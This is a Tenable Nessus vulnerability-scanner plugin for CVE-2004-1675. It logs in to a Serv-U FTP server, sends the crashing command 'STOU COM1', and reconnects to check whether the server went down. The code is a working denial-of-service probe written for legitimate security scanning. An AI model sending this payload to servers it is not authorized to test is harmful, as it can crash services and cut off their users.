#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(14709);
 script_version("$Revision: 1.23 $");
   
 script_cve_id("CVE-2004-1675");
 script_bugtraq_id(11155);
 script_osvdb_id(9898);
 script_xref(name:"Secunia", value:"12507");

 script_name(english:"Serv-U 4.x-5.x STOU Command MS-DOS Argument Remote DoS");
  
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a remote denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to crash the remote FTP server by sending it a STOU
command. An attacker could exploit this flaw to prevent users from
sharing data through FTP, and may even crash this host." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2004/Sep/99" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/09/13");
 script_set_attribute(attribute:"patch_publication_date", value: "2004/09/27");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/09/11");
 script_cvs_date("$Date: 2016/10/10 15:57:05 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_summary(english:"Crashes Serv-U");
 script_category(ACT_DENIAL);
 script_family(english:"FTP");
  
 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
		  
 script_dependencie("ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/servu");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

port = get_ftp_port(default: 21);

 banner = get_ftp_banner(port:port);
 if ( ! banner || "Serv-U FTP Server" >!< banner ) exit(0);
soc = open_sock_tcp(port);
if (! soc) exit(1);

if (! ftp_authenticate(socket:soc, user:login, pass:password))
  exit(1);

send(socket:soc, data: 'STOU COM1\r\n');
close(soc);
   
   for (i = 1; i <= 3; i ++)
   {
     soc2 = open_sock_tcp(port);
     if (soc2) break;
     sleep(i);
   }
   to = get_read_timeout();
   if ( ! soc2 || ! recv_line(socket:soc2, length:4096, timeout: 3 * to ) )
     security_warning(port);
   else close(soc2);
   close(soc);

exit(0);
